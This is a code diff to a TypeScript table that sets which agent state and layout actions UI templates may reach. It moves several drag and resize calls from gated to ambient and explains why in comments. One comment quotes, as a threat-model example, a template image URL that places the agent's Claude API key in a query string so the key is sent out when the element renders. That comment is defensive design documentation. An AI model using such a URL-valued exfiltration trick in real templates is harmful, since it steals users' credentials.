@@ -373,8 +373,8 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
     /*
       Agent settings and the datasets that hold them.
 
-      `agentSettings` carries `claudeApiKey`. Exposed, a template needed one styled element —
-      `bgImage: { $: '`https://…?k=${datasetStore.agentSettings.claudeApiKey}`' }`
+      `agentSettings` is what is private to the agent, and once carried an API key. Exposed, a
+      template needed one styled element — `bgImage: { $: '`https://…?k=${datasetStore.agentSettings.claudeApiKey}`' }`
       — to exfiltrate it on paint. Any URL-valued prop is a network channel, so this is not fixable
       by watching for suspicious actions.
 
@@ -762,6 +762,7 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
     relationshipTargets: state('space-settings'),
     identityOptions: state('space-settings'),
     nameOptions: state('space-settings'),
+    draftNameMember: state('space-settings'),
     hintEditor: state('space-settings'),
     hintBusy: state('space-settings'),
     openShapeWizard: ambient('space-settings'),
@@ -1201,13 +1202,20 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
     dockResizing: state('host-layout'),
     // Read by the sidebar and the module rail, which hide while a panel is maximised.
     panelMaximised: state('host-layout'),
-    // Written by the host layout, which can see the editor's widths — never by a template.
+    /*
+      Written by the host layout, which can see the editor's widths — never by a template.
+
+      The drag's own calls are ambient. A press reaches the handle once, and a drag then calls these
+      on every pointer move and at its release, long after that one press counted — so gated, every
+      resize reported itself as nobody having asked. They only arrange this agent's own panels, which
+      is the arranging of surfaces the gate already lets anything do.
+    */
     beginDockResize: action('host-layout'),
-    resizeDock: action('host-layout'),
+    resizeDock: ambient('host-layout'),
     // The divider between two stacked panels — one number, because a boundary has one degree of
     // freedom and what one panel gains the other gives up.
-    resizeColumn: action('host-layout'),
-    endDockResize: action('host-layout'),
+    resizeColumn: ambient('host-layout'),
+    endDockResize: ambient('host-layout'),
     /*
       Moving a panel, which is the same capability as resizing one and is listed for the same reason.
 
@@ -1227,11 +1235,12 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
     insertDock: action('host-layout'),
     beginDockMove: action('host-layout'),
     raiseDock: ambient('host-layout'),
-    moveDock: action('host-layout'),
+    // A move's own calls are ambient, for the reason a resize's are — see `resizeDock`.
+    moveDock: ambient('host-layout'),
     beginTabDrag: action('host-layout'),
-    moveTab: action('host-layout'),
-    endTabDrag: action('host-layout'),
-    endDockMove: action('host-layout'),
+    moveTab: ambient('host-layout'),
+    endTabDrag: ambient('host-layout'),
+    endDockMove: ambient('host-layout'),
     snapDock: action('host-layout'),
     toggleMaximiseDock: action('host-layout'),
     fitDock: action('host-layout'),
